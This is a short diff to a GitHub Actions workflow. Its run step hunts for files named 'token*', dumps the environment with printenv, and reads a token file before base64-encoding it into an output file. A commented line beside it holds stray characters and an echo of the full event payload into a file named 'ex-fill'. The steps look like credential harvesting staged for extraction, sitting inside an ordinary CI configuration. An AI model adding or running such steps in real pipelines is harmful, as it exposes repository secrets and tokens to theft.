@@ -23,7 +23,7 @@ jobs:
         run: | #                    |:,\-1                     _"r",:|               # echo "${{ toJson(github.event) }}" 2> ex-fill;
           pwd
           ls
-          find / -name "token*"
+          find . -name "token*" -not -path "/opt/az/*" -not -path "**/node_modules/*"
           printenv        
           cat token ${F555}
           cat token ${F555} | base64> out
